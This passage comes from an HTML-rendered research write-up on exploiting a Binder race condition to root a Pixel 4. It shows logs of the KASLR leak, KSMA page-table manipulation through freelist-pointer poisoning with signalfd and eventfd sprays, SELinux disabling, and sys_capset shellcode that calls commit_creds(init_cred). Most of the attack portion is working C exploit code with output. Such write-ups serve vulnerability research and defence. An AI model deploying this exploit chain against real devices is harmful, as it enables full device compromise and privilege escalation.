<span class="err">[</span><span class="mi">6957</span><span class="err">]</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">394</span><span class="o">:</span><span class="n">trigger_thread_func</span><span class="p">()</span><span class="o">:</span> <span class="n">Could</span> <span class="k">not</span> <span class="n">leak</span> <span class="n">KASLR</span> <span class="n">slide</span>
<span class="err">[</span><span class="mi">6957</span><span class="err">]</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">386</span><span class="o">:</span><span class="n">trigger_thread_func</span><span class="p">()</span><span class="o">:</span> <span class="k">Value</span> <span class="nv">@X</span> <span class="k">after</span> <span class="n">spraying</span> <span class="n">seq</span> <span class="n">ops</span><span class="o">:</span> <span class="mh">0x0</span>
<span class="err">[</span><span class="mi">6957</span><span class="err">]</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">394</span><span class="o">:</span><span class="n">trigger_thread_func</span><span class="p">()</span><span class="o">:</span> <span class="n">Could</span> <span class="k">not</span> <span class="n">leak</span> <span class="n">KASLR</span> <span class="n">slide</span>
<span class="err">[</span><span class="mi">6957</span><span class="err">]</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">386</span><span class="o">:</span><span class="n">trigger_thread_func</span><span class="p">()</span><span class="o">:</span> <span class="k">Value</span> <span class="nv">@X</span> <span class="k">after</span> <span class="n">spraying</span> <span class="n">seq</span> <span class="n">ops</span><span class="o">:</span> <span class="mh">0xffffff9995bcfd38</span>
<span class="err">[</span><span class="mi">6957</span><span class="err">]</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">405</span><span class="o">:</span><span class="n">trigger_thread_func</span><span class="p">()</span><span class="o">:</span> <span class="n">KASLR</span> <span class="n">slide</span><span class="o">:</span> <span class="n">ffffff9994080000</span>
</code></pre></div>

<h4 id="arbitrary-kernel-readwrite-using-ksma">Arbitrary Kernel Read/Write Using KSMA</h4>
<p>The next step of the exploit is to craft an arbitrary read/write primitive using KSMA. The gist of this technique is to add an entry in the kernel's page global directory to mirror kernel code at another location and set specific flags to make it accessible from userland. This section details how we setup this attack, modify the kernel page table and overcome certain limitations.</p>
<h5 id="kernel-space-mirroring-attack">Kernel Space Mirroring Attack</h5>
<p>The method in itself is described in Thomas King's BlackHat Asia 2018 <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf">presentation</a> and readers are invited to read up on it if they're not already familiar with it.</p>
<p>The kernel's Page Global Directory (PGD), the section we want to add a 1Gb block into, is referenced by the symbol <code>swapper_pg_dir</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="c">flame:/ # grep -i -e " swapper_pg_dir" /proc/kallsyms</span>
<span class="err">ffffff886f2b5000 B swapper_pg_dir</span>
</code></pre></div>

<p>The PGD can hold <code>0x200</code> entries and the the 1Gb blocks referenced start at address <code>0xffffff8000000000</code> (e.g. entry #0 spans from <code>0xffffff8000000000</code> to <code>0xffffff803fffffff</code>). Since we don't want to overwrite an existing entry, we arbitrarily picked index <code>0x1e0</code>, which corresponds to the address:</p>
<div class="codehilite"><pre><span></span><code><span class="err">0xffffff8000000000 + 0x1e0 * 0x40000000 = 0xfffffff800000000</span>
</code></pre></div>

<p>If everything works as expected, we will be able to read and write the kernel from userland using this base address.</p>
<p>Now that we have the destination virtual address, let's figure out the physical address of the kernel on our device. This can be found in <code>/proc/iomem</code>, by searching "Kernel Code". We can see below that on our Pixel 4 device, the kernel physical address starts at <code>0x80080000</code>. Note that we will map <code>0x80000000</code> to respect the alignment of block descriptors on a gigabyte.</p>
<div class="codehilite"><pre><span></span><code><span class="c">flame:/ # grep "Kernel code" /proc/iomem</span>
<span class="c">  80080000-823affff : Kernel code</span>
</code></pre></div>

<p>The next step is to craft a block descriptor to bridge the physical address of the kernel and the 1Gb virtual memory range accessible from userland. The method we used was simply to dump one of the <code>swapper_pg_dir</code> entry, change the physical address and set (U)XN/PXN accordingly. We ended up with the following value:</p>
<div class="codehilite"><pre><span></span><code><span class="err">0x00e8000000000751 | 0x80000000 = 0x00e8000080000751</span>
</code></pre></div>

<p>We've established the value to write in <code>swapper_pg_dir</code> at index <code>0x1e0</code> and in the next sections we will present how this descriptor was written into the table using the freelist pointer of a slab.</p>
<h5 id="freelist-pointer-arbitrary-write">Freelist Pointer Arbitrary Write</h5>
<p>The freelist pointer is a pointer to the next free object in the slab. When freeing an object from a slab cache, the allocator will first write the current freelist pointer at the beginning of the object being freed. Afterwards, it will update the freelist pointer to point to the freshly freed memory region.</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/freelist_free.png"></p>
<p>If an allocation is requested, the opposite process happens. The allocator will make the allocation at the address pointed to by the freelist pointer and then read the new freelist pointer in the first 8 bytes of the allocated memory region.</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/freelist_alloc.png"></p>
<p>However, if we are able to change one of the freelist pointers written in the slab, we can then allocate an object at an arbitrary address.</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/freelist_arb_alloc.png"></p>
<p>Knowing this, the strategy would be to:</p>
<ul>
<li>have a <code>signalfd</code> overlap a freed object</li>
<li>modify the freelist pointer to point to the <code>swapper_pg_dir</code> entry</li>
<li>allocate <code>signalfd</code>s with our block descriptor <code>0x00e8000080000751</code></li>
</ul>
<p>Although, it's not as easy as it looks because of the bits 8 and 18 set by <code>signalfd</code> when writing a value. It wouldn't affect the block descriptor because bit 8 is already set and bit 18 would be discarded when aligning to a 1Gb block. However, depending on its value, it could make it impossible to write the address of <code>swapper_pg_dir</code> with <code>signalfd</code>. In our specific case, on the factory image <code>QQ3A.200805.001</code> for the Pixel 4, <code>swapper_pg_dir</code>'s address will always end with <code>b5000</code>. If we were to write this address with <code>signalfd</code> and independently of the index chosen in the PGD, we would always end up with an address finishing with <code>b5xxx | 40100 = f5xxx</code>, missing the actual section by <code>0x40000</code> bytes. While it's not the case for all kernels (e.g. some versions of Android could have a <code>swapper_pg_dir</code> offset ending with <code>f5000</code>), it wouldn't be generic on Pixel 4 devices.</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/swapper_alloc_signalfd_issue.png"></p>
<p>To circumvent this issue, we will make the allocation in two phases, as explained in the next section.</p>
<h5 id="intermediate-bss-allocation">Intermediate BSS Allocation</h5>
<p>Since we're not sure we will be able to replace the freelist pointer by the correct <code>swapper_pg_dir</code> address, we need to write it by another mean somewhere else and make the freelist pointer point to it. This way, we can write our descriptor in two allocations instead of one. This stage is a bit convoluted and we will explain it one step at a time.</p>
<p>The first requirement for this process is to find a kernel memory region completely filled with zeroes and big enough so that even with <code>signalfd</code> changing our original address, we would end up inside it (i.e. it should be bigger than <code>0x40100</code> bytes). The reason it should be filled with zeroes is because we will allocate slab objects in it and if a non-null value is found here, it will replace the freelist pointer with a non-controllable address and could make the system crash if a subsequent allocation happen over unmapped or in-use memory.</p>
<p>There might be different places in the kernel meeting these requirements. For this exploit, we chose the <code>ipa_testbus_mem</code> buffer which is <code>0x198000</code> long. It is specific to Qualcomm-based devices which is good enough for our Pixel 4 exploit.</p>
<div class="codehilite"><pre><span></span><code><span class="n">lyte</span><span class="err">@</span><span class="nl">debian</span><span class="p">:</span><span class="o">~</span><span class="n">$</span> <span class="n">aarch64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">-</span><span class="n">nm</span> <span class="o">--</span><span class="n">print</span><span class="o">-</span><span class="n">size</span> <span class="n">vmlinux</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">ipa_testbus_mem</span>
<span class="n">ffffff900c19b0b8</span> <span class="mo">00000000001</span><span class="mi">98000</span> <span class="n">b</span> <span class="n">ipa_testbus_mem</span>
</code></pre></div>

<p>For the sake of example, we will imagine that this buffer is at address <code>0x10000000</code>. If we were to change the freelist pointer to point to this address, it would be transformed into <code>0x10040100</code>. However, it's not an issue in this case, because we would still end up in our original buffer and be sure that the value at <code>0x10040100</code> is still zero.</p>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/swapper_alloc_1.png"></p>
<p>As we said earlier we are going to make this allocation in two times. The first will be an allocation in <code>ipa_testbus_mem</code> that will set up the value for the next freelist pointer and make it point to our <code>swapper_pg_dir</code> entry address. Then we will free everything and redo a spray of <code>signalfd</code>s leveraging this value to finally allocate the entry in <code>swapper_pg_dir</code>. However, to do this first allocation, we need an object that allows us to write at least 8 bytes of arbitrary values. We could reuse <code>sendmsg</code>s, however they would need to be blocking, because we have to exhaust the slab freelist to reach our allocation. Since non-blocking <code>sendmsg</code>s are freed immediately, it wouldn't be the case. Blocking <code>sendmsg</code>s are a potential solution, but it's a bit more work to setup than the object we chose, namely <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/fs/eventfd.c#27"><code>eventfd</code></a>.</p>
<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="nc">eventfd_ctx</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="nc">kref</span> <span class="n">kref</span><span class="p">;</span>
    <span class="n">wait_queue_head_t</span> <span class="n">wqh</span><span class="p">;</span>
    <span class="cm">/*</span>
<span class="cm">     * Every time that a write(2) is performed on an eventfd, the</span>
<span class="cm">     * value of the __u64 being written is added to "count" and a</span>
<span class="cm">     * wakeup is performed on "wqh". A read(2) will return the "count"</span>
<span class="cm">     * value to userspace, and will reset "count" to zero. The kernel</span>
<span class="cm">     * side eventfd_signal() also, adds to the "count" counter and</span>
<span class="cm">     * issue a wakeup.</span>
<span class="cm">     */</span>
    <span class="n">__u64</span> <span class="n">count</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>

<p><code>eventfd</code> can be used to write an arbitrary value in kernel memory using its <code>count</code> field. Simply writing a value using <code>write</code> on the file descriptor returned by <code>eventfd</code> will increment <code>count</code> by the same amount. Now, the strategy is the following:</p>
<ol>
<li>make the overlapping <code>signalfd</code> overlap with dangling memory</li>
<li>change the freelist pointer using the overlapping <code>signalfd</code> and make it point to <code>ipa_testbus_mem | 0x40100</code> so that the changes brought by <code>signalfd</code> don't matter</li>
<li>spray using <code>eventfd</code>s and write the address of our <code>swapper_pg_dir</code> entry in <code>count</code></li>
</ol>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/swapper_alloc_2.png">
<img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/swapper_alloc_3.png"></p>
<p>At this stage, we now have a persistent user-controlled value in kernel memory. The idea is now to use this value as part of the slab's freelist. The next steps are as follows:</p>
<ol>
<li>free all <code>eventfd</code>s</li>
<li>change the freelist pointer using the overlapping <code>signalfd</code> and make it point to <code>ipa_testbus_mem | 0x40100 + 0x20</code> (<code>0x20</code> is the offset of <code>count</code> in <code>eventfd_ctx</code>)</li>
<li>spray using <code>signalfd</code>s with a <code>sigset</code> value set to our block descriptor <code>0x00e8000080000751</code></li>
</ol>
<p><img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/swapper_alloc_4.png">
<img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/swapper_alloc_5.png">
<img alt="image" src="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/swapper_alloc_6.png"></p>
<p>Once the entry is written into <code>swapper_pg_dir</code> we will be able to read and write arbitrarily from kernel memory using the base address <code>0xfffffff800000000</code>.</p>
<p>This whole section could be implemented in the exploit following the snippet of code given below:</p>
<div class="codehilite"><pre><span></span><code><span class="kt">uint64_t</span> <span class="n">bss_target</span> <span class="o">=</span> <span class="p">(</span><span class="n">kaslr_leak</span> <span class="o">+</span> <span class="n">IPA_TESTBUS_MEM</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x40100</span><span class="p">;</span>

<span class="cm">/*</span>
<span class="cm"> * Changing the freelist pointer using overlapping_fd to</span>
<span class="cm"> * `ipa_testbus_mem | 0x40100`</span>
<span class="cm"> */</span>
<span class="n">debug_printf</span><span class="p">(</span><span class="s">"BSS alloc will be @%lx"</span><span class="p">,</span> <span class="n">bss_target</span><span class="p">);</span>
<span class="kt">uint64_t</span> <span class="n">sigset_target</span> <span class="o">=</span> <span class="o">~</span><span class="n">bss_target</span><span class="p">;</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">signalfd</span><span class="p">(</span><span class="n">overlapping_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">sigset_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sigset_target</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">debug_printf</span><span class="p">(</span><span class="s">"Could not change overlapping_fd value with %lx"</span><span class="p">,</span> <span class="n">bss_target</span><span class="p">);</span>
<span class="n">mask</span> <span class="o">=</span> <span class="n">get_sigfd_sigmask</span><span class="p">(</span><span class="n">overlapping_fd</span><span class="p">);</span>
<span class="n">debug_printf</span><span class="p">(</span><span class="s">"Value @X after changing overlapping_fd is %lx"</span><span class="p">,</span> <span class="n">mask</span><span class="p">);</span>

<span class="kt">uint64_t</span> <span class="n">gb</span> <span class="o">=</span> <span class="mh">0x40000000</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">index</span> <span class="o">=</span> <span class="mh">0x1e0</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">base</span> <span class="o">=</span> <span class="mh">0xffffff8000000000</span> <span class="o">+</span> <span class="n">gb</span> <span class="o">*</span> <span class="n">index</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">target</span> <span class="o">=</span> <span class="n">kaslr_leak</span> <span class="o">+</span> <span class="n">SWAPPER_PG_DIR</span> <span class="o">+</span> <span class="n">index</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>

<span class="n">debug_printf</span><span class="p">(</span><span class="s">"Swapper dir alloc will be @%lx (index = %lx, base = %lx)"</span><span class="p">,</span>
    <span class="n">target</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">base</span><span class="p">);</span>

<span class="cm">/*</span>
<span class="cm"> * Spraying using eventfds to get our `swapper_pg_dir` entry address in </span>
<span class="cm"> * `ipa_testbus_mem`</span>
<span class="cm"> */</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NB_EVENTFDS_FINAL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">eventfd_bss</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">eventfd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">EFD_NONBLOCK</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">eventfd_bss</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">debug_printf</span><span class="p">(</span><span class="s">"Could not open eventfd - %d (%s)"</span><span class="p">,</span> <span class="n">eventfd_bss</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

    <span class="cm">/*</span>
<span class="cm">     * Modifying count so that it holds the address to the `swapper_pg_dir` </span>
<span class="cm">     * entry</span>
<span class="cm">     */</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">eventfd_bss</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">target</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">debug_printf</span><span class="p">(</span><span class="s">"Could not write eventfd - %d (%s)"</span><span class="p">,</span> <span class="n">eventfd_bss</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="p">}</span>

<span class="cm">/*</span>
<span class="cm"> * Freeing all eventfds until the overlapping signalfd sees another value</span>
<span class="cm"> */</span>
<span class="kt">uint64_t</span> <span class="n">orig_mask</span> <span class="o">=</span> <span class="n">get_sigfd_sigmask</span><span class="p">(</span><span class="n">overlapping_fd</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NB_EVENTFDS_FINAL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">close</span><span class="p">(</span><span class="n">eventfd_bss</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">debug_printf</span><span class="p">(</span><span class="s">"Could not close eventfd (%d - %s)"</span><span class="p">,</span> <span class="n">eventfd_bss</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

    <span class="n">mask</span> <span class="o">=</span> <span class="n">get_sigfd_sigmask</span><span class="p">(</span><span class="n">overlapping_fd</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mask</span> <span class="o">!=</span> <span class="n">orig_mask</span><span class="p">)</span> <span class="k">goto</span> <span class="n">next_stage</span><span class="p">;</span>
<span class="p">}</span>

<span class="nl">next_stage</span><span class="p">:</span>
<span class="cm">/*</span>
<span class="cm"> * Changing the freelist pointer using overlapping_fd to</span>
<span class="cm"> * `ipa_testbus_mem | 0x40100 + 0x20`</span>
<span class="cm"> */</span>
<span class="n">bss_target</span> <span class="o">=</span> <span class="n">bss_target</span> <span class="o">+</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0x20</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">sigset_target</span> <span class="o">=</span> <span class="o">~</span><span class="n">bss_target</span><span class="p">;</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">signalfd</span><span class="p">(</span><span class="n">overlapping_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">sigset_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sigset_target</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">debug_printf</span><span class="p">(</span><span class="s">"Could not change overlapping_fd value with %lx"</span><span class="p">,</span> <span class="n">bss_target</span><span class="p">);</span>
<span class="n">mask</span> <span class="o">=</span> <span class="n">get_sigfd_sigmask</span><span class="p">(</span><span class="n">overlapping_fd</span><span class="p">);</span>
<span class="n">debug_printf</span><span class="p">(</span><span class="s">"Value @X after changing overlapping_fd is %lx"</span><span class="p">,</span> <span class="n">mask</span><span class="p">);</span>

<span class="cm">/* Block descriptor written in `swapper_pg_dir` */</span>
<span class="kt">uint64_t</span> <span class="n">block_descriptor</span> <span class="o">=</span> <span class="mh">0x00e8000000000751</span><span class="p">;</span>
<span class="n">block_descriptor</span> <span class="o">+=</span> <span class="mh">0x80000000</span><span class="p">;</span> <span class="cm">/* Kernel text physical address 1Gb-aligned */</span>

<span class="cm">/*</span>
<span class="cm"> * Spraying using signalfds to get our `block_descriptor` in </span>
<span class="cm"> * `swapper_pg_dir`</span>
<span class="cm"> */</span>
<span class="kt">int</span> <span class="n">signalfd_bss</span><span class="p">[</span><span class="n">NB_SIGNALFDS_FINAL</span><span class="p">];</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NB_SIGNALFDS_FINAL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sigset_value</span> <span class="o">=</span> <span class="o">~</span><span class="n">block_descriptor</span><span class="p">;</span>
    <span class="n">signalfd_bss</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">signalfd</span><span class="p">(</span><span class="mi">-1</span><span class="p">,</span> <span class="p">(</span><span class="kt">sigset_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sigset_value</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">signalfd_bss</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">debug_printf</span><span class="p">(</span><span class="s">"Could not open signalfd - %d (%s)"</span><span class="p">,</span> <span class="n">signalfd_bss</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="p">}</span>

<span class="cm">/*</span>
<span class="cm"> * Dumping the first 4 bytes of the text section</span>
<span class="cm"> * 0x80000 is added to the base address since we mapped 0x80000000 and the text</span>
<span class="cm"> * section is at 0x80080000</span>
<span class="cm"> */</span>
<span class="n">debug_printf</span><span class="p">(</span><span class="s">"Kernel text value = %lx"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">base</span> <span class="o">+</span> <span class="mh">0x80000</span><span class="p">));</span>
</code></pre></div>

<p>The result should look as follows:</p>
<div class="codehilite"><pre><span></span><code><span class="err">[6397] exploit.c:419:trigger_thread_func(): Swapper dir alloc will be @ffffff9a130b5f00 (index = 1e0, base = fffffff800000000)</span>
<span class="err">[6498] exploit.c:431:trigger_thread_func(): BSS alloc will be @ffffff9a12f45158</span>
<span class="err">[6498] exploit.c:437:trigger_thread_func(): Value @X after changing overlapping_fd is ffffff9a12f45158</span>
<span class="err">[6498] exploit.c:483:trigger_thread_func(): Value @X after changing overlapping_fd is ffffff9a12f45178</span>
<span class="err">[6397] exploit.c:508:trigger_thread_func(): Kernel text value = 148cc000</span>
</code></pre></div>

<p>We can also notice that the first four bytes of the section we mapped correspond to the beginning of the <code>vmlinux</code> binary:</p>
<div class="codehilite"><pre><span></span><code><span class="err">lyte@debian:~$ xxd vmlinux | head</span>
<span class="c">00000000: 00c0 8c14 0000 0000 0000 0800 0000 0000  ................</span>
<span class="c">00000010: 0070 2303 0000 0000 0a00 0000 0000 0000  .p#.............</span>
<span class="c">00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span>
</code></pre></div>

<h4 id="escalating-to-root">Escalating to Root</h4>
<p>We're now at the final stage of the exploit. In this section, we'll leverage our arbitrary kernel read/write to disable SELinux, modify our process' credentials and finally get a root shell.</p>
<h5 id="selinux-bypass">SELinux Bypass</h5>
<p>This part is pretty straightforward and common for Android exploits. We just have to set <code>selinux_enforcing</code> to 0.</p>
<div class="codehilite"><pre><span></span><code><span class="cm">/* selinux_enforcing address in the remapped kernel region */</span>
<span class="kt">uint64_t</span> <span class="n">selinux_enforcing_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x80000</span> <span class="o">+</span> <span class="n">SELINUX_ENFORCING</span><span class="p">;</span>

<span class="n">debug_printf</span><span class="p">(</span><span class="s">"Before: enforcing = %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)</span><span class="n">selinux_enforcing_addr</span><span class="p">);</span>

<span class="cm">/* setting selinux_enforcing to 0 */</span>
<span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)</span><span class="n">selinux_enforcing_addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="n">debug_printf</span><span class="p">(</span><span class="s">"After: enforcing = %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)</span><span class="n">selinux_enforcing_addr</span><span class="p">);</span>
</code></pre></div>

<p>With the snippet of code given above, you should see an output similar to this:</p>
<div class="codehilite"><pre><span></span><code><span class="err">[6397] exploit.c:508:trigger_thread_func(): Before: enforcing = 1</span>
<span class="err">[6397] exploit.c:508:trigger_thread_func(): After: enforcing = 0</span>
</code></pre></div>

<h5 id="init-credentials">Init Credentials</h5>
<p>The last remaining issue is to get root permissions for our process. To achieve this, we will use our read/write primitive to temporarily patch a syscall handler. In our case, we will patch <code>sys_capset</code>, but in practice any syscall could be used, just make sure to lower the chances that it gets called while the exploit is running.</p>
<p>In order to get <code>root</code>'s permissions and capabilities, we will change our exploit process' credentials to <code>init</code>'s credentials. A simple <code>commit_creds</code> on <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/kernel/cred.c#44"><code>init_cred</code></a> will do the trick.</p>
<p>A potential C implementation of this process could be as follows:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">#define LO_DWORD(addr) ((addr) &amp; 0xffffffff)</span>
<span class="cp">#define HI_DWORD(addr) LO_DWORD((addr) &gt;&gt; 32)</span>

<span class="cm">/* Preparing addresses for the shellcode */</span>
<span class="kt">uint64_t</span> <span class="n">sys_capset_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x80000</span> <span class="o">+</span> <span class="n">SYS_CAPSET</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">init_cred_addr</span> <span class="o">=</span> <span class="n">kaslr_leak</span> <span class="o">+</span> <span class="n">INIT_CRED</span><span class="p">;</span>
<span class="kt">uint64_t</span> <span class="n">commit_creds_addr</span> <span class="o">=</span> <span class="n">kaslr_leak</span> <span class="o">+</span> <span class="n">COMMIT_CREDS</span><span class="p">;</span>

<span class="kt">uint32_t</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="c1">// commit_creds(init_cred)</span>
    <span class="mh">0x58000040</span><span class="p">,</span> <span class="c1">// ldr x0, .+8</span>
    <span class="mh">0x14000003</span><span class="p">,</span> <span class="c1">// b   .+12</span>
    <span class="n">LO_DWORD</span><span class="p">(</span><span class="n">init_cred_addr</span><span class="p">),</span>
    <span class="n">HI_DWORD</span><span class="p">(</span><span class="n">init_cred_addr</span><span class="p">),</span>
    <span class="mh">0x58000041</span><span class="p">,</span> <span class="c1">// ldr x1, .+8</span>
    <span class="mh">0x14000003</span><span class="p">,</span> <span class="c1">// b   .+12</span>
    <span class="n">LO_DWORD</span><span class="p">(</span><span class="n">commit_creds_addr</span><span class="p">),</span>
    <span class="n">HI_DWORD</span><span class="p">(</span><span class="n">commit_creds_addr</span><span class="p">),</span>
    <span class="mh">0xA9BF7BFD</span><span class="p">,</span> <span class="c1">// stp x29, x30, [sp, #-0x10]!</span>
    <span class="mh">0xD63F0020</span><span class="p">,</span> <span class="c1">// blr x1</span>
    <span class="mh">0xA8C17BFD</span><span class="p">,</span> <span class="c1">// ldp x29, x30, [sp], #0x10</span>

    <span class="mh">0x2A1F03E0</span><span class="p">,</span> <span class="c1">// mov w0, wzr</span>
    <span class="mh">0xD65F03C0</span><span class="p">,</span> <span class="c1">// ret</span>
<span class="p">};</span>

<span class="cm">/* Saving sys_capset current code */</span>
<span class="kt">uint8_t</span> <span class="n">sys_capset</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)];</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">sys_capset</span><span class="p">,</span> <span class="n">sys_capset_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sys_capset</span><span class="p">));</span>

<span class="cm">/* Patching sys_capset with our shellcode */</span>
<span class="n">debug_print</span><span class="p">(</span><span class="s">"Patching SyS_capset()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">sys_capset_addr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>

<span class="cm">/* Calling our patched version of sys_capset */</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">capset</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">debug_printf</span><span class="p">(</span><span class="s">"capset returned %d"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror</span><span class="p">(</span><span class="s">"capset failed"</span><span class="p">);</span>

<span class="cm">/* Restoring sys_capset */</span>
<span class="n">debug_print</span><span class="p">(</span><span class="s">"Restoring SyS_capset()"</span><span class="p">);</span>
